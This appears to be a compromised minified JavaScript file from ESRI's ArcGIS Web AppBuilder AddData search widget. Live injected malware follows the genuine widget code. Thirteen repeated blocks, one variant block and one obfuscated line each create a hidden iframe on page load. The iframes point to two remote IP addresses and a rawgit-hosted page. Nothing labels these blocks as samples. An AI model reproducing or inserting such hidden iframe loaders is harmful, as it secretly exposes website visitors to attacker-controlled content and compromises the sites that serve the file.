// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/AddData/search/templates/SearchPane.html":'\x3cdiv class\x3d"search-pane"\x3e\r\n  \x3cdiv class\x3d"search-pane-header" data-dojo-attach-point\x3d"headerNode"\x3e\r\n    \x3cdiv class\x3d"search-bar main-search-bar"\x3e\r\n      \x3cdiv data-dojo-type\x3d"widgets/AddData/search/ScopeOptions"\r\n        data-dojo-attach-point\x3d"scopeOptions"\x3e\r\n      \x3c/div\x3e\r\n      \x3c!--\x3cspan class\x3d"search-box-placeholder" data-dojo-attach-point\x3d"searchBoxPlaceholder"\x3e\x3c/span\x3e--\x3e\r\n      \x3cdiv data-dojo-type\x3d"widgets/AddData/search/SearchBox"\r\n        data-dojo-attach-point\x3d"searchBox"\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"search-bar-separator"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"search-bar search-bar-secondary" data-dojo-attach-point\x3d"optionsNode"\x3e\r\n      \x3cdiv data-dojo-type\x3d"widgets/AddData/search/BBoxOption"\r\n        data-dojo-attach-point\x3d"bboxOption"\x3e\r\n      \x3c/div\x3e\r\n      \x3c!--\r\n      \x3cdiv class\x3d"filter-wrapper2"\x3e\r\n        \x3cdiv data-dojo-type\x3d"widgets/AddData/search/TypeOptions"\r\n          data-dojo-attach-point\x3d"typeOptions"\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv data-dojo-type\x3d"widgets/AddData/search/SortOptions"\r\n          data-dojo-attach-point\x3d"sortOptions"\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n      --\x3e\r\n      \x3cspan class\x3d"filter-placeholder" data-dojo-attach-point\x3d"filterPlaceholder"\x3e\x3c/span\x3e\r\n      \x3cdiv class\x3d"filter-wrapper" data-dojo-attach-point\x3d"filterWrapper"\x3e\r\n        \x3cdiv data-dojo-type\x3d"widgets/AddData/search/TypeOptions"\r\n          data-dojo-attach-point\x3d"typeOptions"\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv data-dojo-type\x3d"widgets/AddData/search/SortOptions"\r\n          data-dojo-attach-point\x3d"sortOptions"\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"search-pane-content" data-dojo-attach-point\x3d"contentNode"\x3e\r\n    \x3cdiv data-dojo-type\x3d"widgets/AddData/search/ResultsPane"\r\n      data-dojo-attach-point\x3d"resultsPane"\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"search-pane-footer jimu-float-leading" data-dojo-attach-point\x3d"footerNode"\x3e\r\n    \x3cdiv data-dojo-type\x3d"widgets/AddData/search/Paging"\r\n      data-dojo-attach-point\x3d"paging"\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv data-dojo-type\x3d"widgets/AddData/search/ResultCount"\r\n      data-dojo-attach-point\x3d"resultCount"\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv style\x3d"clear:both"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/on dojo/dom-class dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./templates/SearchPane.html dojo/i18n!../nls/strings ./SearchBox ./BBoxOption ./ScopeOptions ./TypeOptions ./SortOptions ./ResultsPane ./Paging ./ResultCount".split(" "),function(g,h,d,k,b,l,m,n,p,q){return g([l,m,n],{i18n:q,templateString:p,qDefaultFilter:null,qRequiredFilter:null,searchOnStart:!0,searchContext:null,wabWidget:null,_dfd:null,
postCreate:function(){this.inherited(arguments);d.forEach(this.getComponents(),function(b){b.searchPane=this},this)},startup:function(){this._started||(this.inherited(arguments),this.bindEvents(),this.searchOnStart&&this.search())},_onFilterPlaceholderChanged:function(){b.contains(this.filterPlaceholder,"opened")?(b.remove(this.filterPlaceholder,"opened"),b.remove(this.filterWrapper,"show")):(this.filterWrapper.style.top=this.headerNode.clientHeight+"px",b.add(this.filterPlaceholder,"opened"),b.add(this.filterWrapper,
"show"))},_onSearchBoxPlaceholderChanged:function(){},bindEvents:function(){this.own(k(this.filterPlaceholder,"click",h.hitch(this,this._onFilterPlaceholderChanged)))},buildQueryParams:function(b){var c=null;"string"===typeof this.qRequiredFilter&&0<this.qRequiredFilter.length&&(c=this.qRequiredFilter);var a={q:c,canSortByRelevance:!1};d.forEach(this.getComponents(),function(c){c.appendQueryParams(a,b)});delete a.canSortByRelevance;null===a.q&&"string"===typeof this.qDefaultFilter&&0<this.qDefaultFilter.length&&
(a.q=this.qDefaultFilter);return a},getComponents:function(){return[this.searchBox,this.bboxOption,this.scopeOptions,this.typeOptions,this.sortOptions,this.resultsPane,this.paging,this.resultCount]},resize:function(){this.contentNode.style.top=this.headerNode.clientHeight+1+"px"},search:function(){var b=this,c={},a=this.buildQueryParams(c);if(null!==a&&null!==a.q){a&&null===a.sortField&&(a.sortOrder="desc");var e=this.searchContext.portal;c.scopeIsArcGISOnline&&this.searchContext.arcgisOnlinePortal&&
(e=this.searchContext.arcgisOnlinePortal);null!==this._dfd&&this._dfd.cancel("Search aborted.",!1);var f=null;this._dfd=f=e.queryItems(a).then(function(a){f.isCanceled()||(a.queryParams||(a.queryParams={start:a.start,num:a.num},a.nextQueryParams||"undefined"===typeof a.nextStart||-1===a.nextStart||(a.nextQueryParams={start:a.nextStart})),d.forEach(b.getComponents(),function(b){b.processResults(a)}))}).otherwise(function(a){console.warn("searchError",a)})}},_showLayers:function(){this.wabWidget&&this.wabWidget.showLayers()}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});